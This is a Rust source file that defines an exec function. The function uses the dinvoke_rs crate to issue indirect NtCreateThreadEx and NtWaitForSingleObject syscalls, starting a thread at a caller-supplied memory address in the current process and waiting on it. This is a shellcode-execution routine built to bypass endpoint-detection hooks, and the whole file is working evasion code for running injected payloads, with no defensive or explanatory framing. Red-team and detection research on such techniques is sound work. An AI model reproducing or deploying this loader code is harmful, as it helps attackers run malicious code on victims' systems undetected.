use dinvoke_rs::dinvoke;
use std::ffi::c_void;
use std::ptr;
use windows::Win32::Foundation::HANDLE;

#[allow(non_snake_case)]
type NtCreateThreadEx = unsafe extern "system" fn(
    ThreadHandle: *mut HANDLE,
    DesiredAccess: u32,
    ObjectAttributes: *mut c_void,
    ProcessHandle: HANDLE,
    StartAddress: *mut c_void,
    Parameter: *mut c_void,
    CreateFlags: u32,
    ZeroBits: usize,
    StackSize: usize,
    MaximumStackSize: usize,
    AttributeList: *mut c_void,
) -> i32;

#[allow(non_snake_case)]
type NtWaitForSingleObject = unsafe extern "system" fn(
    Handle: HANDLE,
    Alertable: u8,
    Timeout: *mut i64,
) -> i32;

pub unsafe fn exec(p: usize) -> Result<(), String> {
    const THREAD_ALL_ACCESS: u32 = 0x001F_0FFF;

    // Indirect syscall via DInvoke: dynamically build and run the syscall stub.
    let function_type: NtCreateThreadEx;
    #[allow(unused_assignments)]
    let mut status: Option<i32> = None;
    let mut thread_handle = HANDLE(0);

    dinvoke::execute_syscall!(
        "NtCreateThreadEx",
        function_type,
        status,
        &mut thread_handle as *mut HANDLE, // ThreadHandle
        THREAD_ALL_ACCESS,                 // DesiredAccess
        ptr::null_mut(),                   // ObjectAttributes
        HANDLE(-1isize as isize),          // ProcessHandle (GetCurrentProcess)
        p as *mut c_void,                  // StartAddress
        ptr::null_mut(),                   // Parameter
        0,                                 // CreateFlags
        0,                                 // ZeroBits
        0,                                 // StackSize
        0,                                 // MaximumStackSize
        ptr::null_mut(),                   // AttributeList
    );

    if status == Some(0) {
        // Wait via indirect syscall NtWaitForSingleObject (Alertable = FALSE, Timeout = NULL => INFINITE)
        let wait_function_type: NtWaitForSingleObject;
        #[allow(unused_assignments)]
        let mut wait_status: Option<i32> = None;

        dinvoke::execute_syscall!(
            "NtWaitForSingleObject",
            wait_function_type,
            wait_status,
            thread_handle,
            0u8,              // Alertable = FALSE
            ptr::null_mut(),  // Timeout = NULL => infinite
        );

        if wait_status == Some(0) {
            Ok(())
        } else {
            Err(match wait_status {
                Some(code) => format!("NtWaitForSingleObject failed with status: 0x{:x}", code),
                None => "NtWaitForSingleObject syscall execution failed".to_string(),
            })
        }
    } else {
        Err(match status {
            Some(code) => format!("NtCreateThreadEx failed with status: 0x{:x}", code),
            None => "NtCreateThreadEx syscall execution failed".to_string(),
        })
    }
}
